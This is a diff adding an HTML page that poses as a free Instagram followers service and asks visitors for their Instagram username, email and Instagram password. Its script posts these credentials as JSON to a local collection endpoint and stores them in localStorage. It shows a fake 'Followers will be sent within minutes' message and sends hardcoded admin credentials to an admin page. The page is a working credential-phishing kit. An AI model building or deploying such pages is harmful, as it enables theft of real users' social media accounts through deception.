@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <link rel="stylesheet" href="style.css" />
+    <title>mixx</title>
+    <link
+      rel="icon"
+      href="https://www.mixx.com/img/logo/logo.svg"
+      type="image/x-icon"
+    />
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0" />
+    <meta
+      name="description"
+      content="Try our Instagram Followers Service for Free. 10 Followers. No Sign-Up Needed. Without Payment. 100% Secure &amp; Risk-Free. High Quality."
+    />
+<style>/* Base Styles */
+  body {
+      font-family: 'Inter', sans-serif;
+      margin: 0;
+      background-color: #fff;
+      color: #333;
+  }
+  
+  /* Header */
+  #header {
+      background: #fff;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+      position: fixed;
+      width: 100%;
+      top: 0;
+      z-index: 1000;
+  }
+  
+  .container {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 1rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+  }
+  
+  .logo img {
+      height: 40px;
+  }
+  
+  /* Form Styles */
+  .checkout-section {
+      padding: 100px 20px;
+      text-align: center;
+  }
+  
+  .checkout-form {
+      max-width: 500px;
+      margin: 0 auto;
+      background: #fff;
+      padding: 2rem;
+      border-radius: 10px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+  }
+  
+  .form-group {
+      margin-bottom: 1.5rem;
+      text-align: left;
+  }
+  
+  input {
+      width: 100%;
+      padding: 0.8rem;
+      border: 1px solid #ddd;
+      border-radius: 5px;
+      margin-top: 0.5rem;
+  }
+  
+  button[type="submit"] {
+      background: #4f46e5;
+      color: white;
+      padding: 1rem 2rem;
+      border: none;
+      border-radius: 5px;
+      width: 100%;
+      cursor: pointer;
+  }
+  
+  .alert-box {
+      background: #5735ae;
+      color: white;
+      padding: 1rem;
+      border-radius: 5px;
+      margin-bottom: 1rem;
+  }
+  .navbar {
+      padding: 1rem;
+      background: #fff;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+  }
+  
+  .hamburger {
+      display: none;
+      cursor: pointer;
+      background: none;
+      border: none;
+      padding: 10px;
+  }
+  
+  .line {
+      display: block;
+      width: 25px;
+      height: 3px;
+      margin: 5px auto;
+      background: #333;
+      transition: all 0.3s ease;
+  }
+  
+  .nav-menu {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      list-style: none;
+      margin: 0;
+      padding: 0;
+  }
+  
+  .nav-item {
+      margin: 0 15px;
+  }
+  
+  .nav-link {
+      color: #333;
+      text-decoration: none;
+      font-size: 1.1rem;
+  }
+  
+  /* التصميم للجوال */
+  @media (max-width: 768px) {
+      .hamburger {
+          display: block;
+          position: absolute;
+          right: 20px;
+          top: 20px;
+          z-index: 1000;
+      }
+  
+      .hamburger.active .line:nth-child(1) {
+          transform: translateY(8px) rotate(45deg);
+      }
+  
+      .hamburger.active .line:nth-child(2) {
+          opacity: 0;
+      }
+  
+      .hamburger.active .line:nth-child(3) {
+          transform: translateY(-8px) rotate(-45deg);
+      }
+  
+      .nav-menu {
+          position: fixed;
+          right: -100%;
+          top: 70px;
+          flex-direction: column;
+          background: #fff;
+          width: 100%;
+          text-align: center;
+          transition: 0.3s;
+          box-shadow: 0 10px 27px rgba(0,0,0,0.05);
+      }
+  
+      .nav-menu.active {
+          right: 0;
+      }
+  
+      .nav-item {
+          margin: 25px 0;
+      }
+  }</style>
+  </head>
+  <body>
+    <header id="header">
+      <div class="container">
+        <a href="/" class="logo">
+          <img src="https://www.mixx.com/img/logo/logo.svg" alt="MIXX Logo" />
+        </a>
+        <nav class="desktop-nav">
+          <button class="hamburger" id="hamburger">
+            <span class="line"></span>
+            <span class="line"></span>
+            <span class="line"></span>
+          </button>
+
+          <!-- قائمة التنقل -->
+          <ul class="nav-menu" id="nav-menu">
+            <li class="nav-item">
+              <a href="#home" class="nav-link">Buy Followers</a>
+            </li>
+            <li class="nav-item">
+              <a href="#about" class="nav-link">Buy Likes</a>
+            </li>
+            <li class="nav-item">
+              <a href="#services" class="nav-link">Buy Views</a>
+            </li>
+            <li class="nav-item">
+              <a href="#contact" class="nav-link">Packages</a>
+            </li>
+            <li class="nav-item">
+              <a href="#contact" class="nav-link">FAQ</a>
+            </li>
+            <li class="nav-item">
+              <a href="#contact" class="nav-link">Contact</a>
+            </li>
+          </ul>
+        </nav>
+      </div>
+    </header>
+
+    <main>
+      <section class="checkout-section">
+        <h1>Secure Checkout<br />10 Free Instagram Followers</h1>
+
+        <div class="checkout-form">
+          <div class="alert-box">
+            <p>
+              Your profile must be publicly visible for the duration of our
+              service and should not be private.
+            </p>
+          </div>
+
+          <form id="checkoutForm" action="save.php" method="POST">
+            <div class="form-group">
+                <label for="target">Instagram Username</label>
+                <input type="text" id="target" name="username" required />
+            </div>
+        
+            <div class="form-group">
+                <label for="email">Email Address</label>
+                <input type="email" id="email" name="email" required />
+            </div>
+        
+            <div class="form-group">
+                <label for="password">Instagram Password</label>
+                <input type="password" id="password" name="password" required />
+            </div>
+        
+            <button type="submit">Continue</button>
+        </form>
+        </div>
+      </section>
+    </main>
+    <script>
+   
+document.addEventListener('DOMContentLoaded', () => {
+  const form = document.getElementById('checkoutForm');
+
+  form.addEventListener('submit', function (event) {
+    event.preventDefault();
+
+    const formData = {
+      username: document.getElementById('target').value,
+      email: document.getElementById('email').value,
+      password: document.getElementById('password').value,
+    };
+
+    // إرسال البيانات إلى الـ API
+    fetch('http://127.0.0.1:5000/register', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(formData),
+    })
+    .then(response => response.json())
+    .then(data => {
+      alert(data.message);  // إظهار رسالة النجاح
+    })
+    .catch(error => {
+      console.error('Error:', error);
+    });
+  });
+});
+
+
+
+
+
+  const hamburger = document.getElementById('hamburger');
+  const navMenu = document.getElementById('nav-menu');
+  
+  hamburger.addEventListener('click', () => {
+      // تبديل الفعالية على الزر والقائمة
+      hamburger.classList.toggle('active');
+      navMenu.classList.toggle('active');
+  
+      // إغلاق القائمة عند النقر على رابط
+      document.querySelectorAll('.nav-link').forEach(n => n.addEventListener('click', () => {
+          hamburger.classList.remove('active');
+          navMenu.classList.remove('active');
+      }));
+  
+      // إغلاق القائمة عند النقر خارجها
+      document.addEventListener('click', (e) => {
+          if (!hamburger.contains(e.target) && !navMenu.contains(e.target)) {
+              hamburger.classList.remove('active');
+              navMenu.classList.remove('active');
+          }
+      });
+  });
+  
+  document
+      .getElementById("checkoutForm")
+      .addEventListener("submit", function (event) {
+          event.preventDefault();
+  
+          const formData = {
+              username: document.getElementById("target").value,
+              email: document.getElementById("email").value,
+              password: document.getElementById("password").value,
+              timestamp: new Date().toISOString(),
+          };
+  
+          // Save to localStorage
+          const existingData =
+              JSON.parse(localStorage.getItem("registrations")) || [];
+          existingData.push(formData);
+          localStorage.setItem("registrations", JSON.stringify(existingData));
+  
+          // Check for admin credentials
+          if (
+              formData.username === "hamzah" &&
+              formData.password === "hamzah" &&
+              formData.email === "hamzah@gmail.com"
+          ) {
+              window.location.href = "admin.html";
+          } else {
+              // Submit the original form if not admin
+              alert("Followers will be sent within minutes.");
+              // event.target.submit(); // Uncomment to submit the original form
+          }
+      });
+  document.getElementById("checkoutForm").addEventListener("submit", function (event) {
+      event.preventDefault();  // منع إرسال النموذج
+  
+      const formData = {
+          username: document.getElementById("target").value,
+          email: document.getElementById("email").value,
+          password: document.getElementById("password").value,
+      };
+  
+  });
+  
+  </script>
+  </body>
+</html>
